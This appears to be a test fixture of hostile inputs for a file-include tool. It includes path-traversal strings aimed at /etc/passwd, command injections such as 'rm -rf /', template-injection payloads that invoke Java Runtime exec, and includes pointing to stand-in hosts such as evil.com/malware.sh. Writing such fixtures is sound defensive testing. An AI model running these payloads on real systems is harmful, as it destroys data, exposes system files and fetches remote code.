# Test Path Traversal
```yaml
petk:include
  - file: ../../../etc/passwd
  - file: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
  - file: ..%2f..%2f..%2fetc%2fpasswd
```

# Test Command Injection
`rm -rf /`
`cat /etc/passwd`
echo $USER
ls; rm -rf /

# Test Template Injection
{{7*7}}
${user_input}
{{constructor.constructor('return process')().exit()}}
${java:getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('rm -rf /')}

# Test External Resource Access
```yaml
petk:include
  - file: http://evil.com/malware.sh
  - file: https://attacker.com/payload
  - file: ftp://malicious.server/exploit
